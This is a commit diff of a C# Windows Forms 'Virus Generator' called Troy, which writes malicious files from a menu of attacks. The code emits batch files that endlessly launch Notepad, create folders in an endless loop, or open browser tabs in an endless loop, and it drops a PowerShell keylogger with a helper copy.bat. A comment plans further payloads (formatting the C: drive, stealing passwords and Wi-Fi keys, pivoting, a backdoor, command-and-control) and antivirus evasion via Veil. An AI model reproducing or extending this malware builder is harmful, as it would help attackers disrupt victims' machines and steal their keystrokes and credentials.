updated and added proj 02

+++ C#/VirusGenerator/VirusGenerator/Form1.cs
@@ -2,7 +2,7 @@
 
 Project: Virus Generator
 
-Goals/TODO: 
+Goals: 
 1. Make a gui program that will take some user input and output a virus.
 2. Viruses can be ran through Veil to further obfustecate the signature
 3. Can Generate .exe, .bat files (soon will support many formats) - .bat files supported.
@@ -19,7 +19,25 @@ Logic:
 1. Take some user input about what kind of virus they want to generate
 2. Write out those specifications to a file.
 
-
+Categories:
+1. Destructive
+    a. Format C: Drive
+    b. Overheat CPU / RAM
+2. Espionage
+    a. Keylogger
+    b. Screen capture
+    c. Browser History
+    d. Password Grabbing
+    e. Wifi Password Grabbing
+3. Recon
+    a. LAN scanning
+    b. User accounts - create / delete
+    c. Pivoting
+4. Control
+    a. Disable mouse/keyboard
+    b. Disable USB ports
+5. Backdoor?
+6. C&C?
 */
 
 
@@ -41,11 +59,9 @@ namespace VirusGenerator
     public partial class Troy : Form
     {
 
-        // Init class level variables
-        string getKeys = Properties.Resources.Get_Keystrokes;
-        string readmeKeylogger = Properties.Resources.readmeKeylogger;
-        string copyKeylogger = Properties.Resources.copyKeylogger;
+       
 
+        // Init class level variables
         string _outputFolder;
         string _fileName;
         string _fileExt;
@@ -63,8 +79,8 @@ namespace VirusGenerator
         {
             
             _outputFolder = @TxtBoxDes.Text; //The @ escapes the folder location (i.e C:\\Users\\..)
-            _fileName = TxtBoxFileName.Text;
-            _fileExt = CBoxFor.Text;
+            _fileName     = TxtBoxFileName.Text;
+            _fileExt      = CBoxFor.Text;
 
             
 
@@ -73,32 +89,51 @@ namespace VirusGenerator
             {
                 string[] infiniteLoopCmd = { "@echo off", ":loop", "start notepad.exe", "goto loop" };
                 File.WriteAllLines(_outputFolder + _fileName + _fileExt, infiniteLoopCmd);
+                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
             }
             if (CBoxAttack.Text == "Folder Bomb Attack")
             {
 
                 string[] folderBombAttackCmd = { "@echo off", "cd desktop", ":loop", "mkdir virus", "goto loop" };
                 File.WriteAllLines(_outputFolder + _fileName + _fileExt, folderBombAttackCmd);
-
+                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
             }
 
             if (CBoxAttack.Text == "Keylogger")
             {
-                MessageBox.Show("Please note that this virus will only work with the name 'Get-Keystrokes', the name will automatically be changed for you.", "NOTICE");
+                if (!Directory.Exists(_outputFolder + "Get-Keystrokes"))
+                {
+                    // Resource variables
+                    string getKeys = Properties.Resources.Get_Keystrokes;
+                    string readmeKeylogger = Properties.Resources.readmeKeylogger;
+                    string copyKeylogger = Properties.Resources.copyKeylogger;
 
-                _fileName = "Get-Keystrokes"; //Auto switch the fileName and fileExt to what the keylogger requires.
-                _fileExt = ".ps1";
+                    MessageBox.Show("Please note that this virus will only work with the name 'Get-Keystrokes', the name will automatically be changed for you.", "NOTICE");
 
-                string folderPath = _outputFolder + "Get-Keystrokes";
+                    _fileName = "Get-Keystrokes"; //Auto switch the fileName and fileExt to what the keylogger requires.
+                    _fileExt = ".ps1";
+
+                    string folderPath = _outputFolder + "Get-Keystrokes";
+
+                    Path.Combine(folderPath, _fileName);
+                    Directory.CreateDirectory(folderPath); //Create the directory.
+
+
+                    File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys); //Write the readme, copy.bat and get-keystrokes.ps1 to the directory previously created.
+                    File.WriteAllText(folderPath + "\\" + "README.txt", readmeKeylogger);
+                    File.WriteAllText(folderPath + "\\" + "copy.bat", copyKeylogger);
+
+                    System.Diagnostics.Process.Start(folderPath);
+
+                    ToolStrip.Text = $"Folder created at {folderPath}";
+                }
+                else
+                {
+                    MessageBox.Show("The folder already exists!", "Notice");
+                    ToolStrip.Text = "Folder already exists!";
+                    
+                }
                 
-                Path.Combine(folderPath, _fileName); 
-                Directory.CreateDirectory(folderPath); //Create the directory.
-
-                File.WriteAllText(folderPath + "\\" + _fileName + _fileExt, getKeys); //Write the readme, copy.bat and get-keystrokes.ps1 to the directory previously created.
-                File.WriteAllText(folderPath + "\\" + "README.txt", readmeKeylogger);
-                File.WriteAllText(folderPath + "\\" + "copy.bat", copyKeylogger);
-
-
             }
             
 
@@ -110,44 +145,63 @@ namespace VirusGenerator
 
                 string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyan.cat", "goto loop" };
                 File.WriteAllLines(_outputFolder + _fileName + _fileExt, nyanCatCmd);
-                
-                    
+
+                ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
+
+
             }
 
-            ToolStrip.Text = $"Virus: '{_fileName}{_fileExt}' was saved to {_outputFolder}";
+   
         }
 
+        /// <summary>
+        /// Purpose: Changes toolstrip text when the format is changed.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         public void CBoxFor_SelectedIndexChanged(object sender, EventArgs e)
         {
             string formatSelected = CBoxFor.Text;
-            if (formatSelected == ".exe")
-            {
-                _fileExt = ".exe";
-            }
-            else
-            {
-                _fileExt = ".bat";
-            }
-
+          
             ToolStrip.Text = $"Format Selected: '{formatSelected}'"; //Updates tool stip with format
         }
 
+        /// <summary>
+        /// Purpose: Displays About message when clicked.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void versionToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            MessageBox.Show("Troy \nVirusGenerator v1.0 \n2015"); //About message
+            MessageBox.Show("Troy \nVirusGenerator v1.0 \n2015", "About"); //About message
         }
 
+        /// <summary>
+        /// Purpose: Exits program when clicked.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void BtnExit_Click(object sender, EventArgs e)
         {
             Close(); //closes program when clicked.
         }
 
+        /// <summary>
+        /// Purpose: updates tool strip as name changes.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void TxtBoxFileName_TextChanged(object sender, EventArgs e)
         {
             ToolStrip.Text = $"Name Chosen: '{TxtBoxFileName.Text}'"; //shows updated name in the tool stip
 
         }
 
+        /// <summary>
+        /// Purpose: Changes toolstrip text when a different attack is selected.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void CBoxAttack_SelectedIndexChanged(object sender, EventArgs e)
         {
             string attackSelected = CBoxAttack.Text;
@@ -157,14 +211,14 @@ namespace VirusGenerator
             ToolStrip.Text = $"Attack Selected: '{attackSelected}'";
         }
 
+        /// <summary>
+        /// Purpose: Closes program when selected.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void closeToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Close(); //closes program from the menu stip.
-        }
-
-        private void BtnDebug_Click(object sender, EventArgs e)
-        {
-            MessageBox.Show(getKeys);
         }
     }
 }
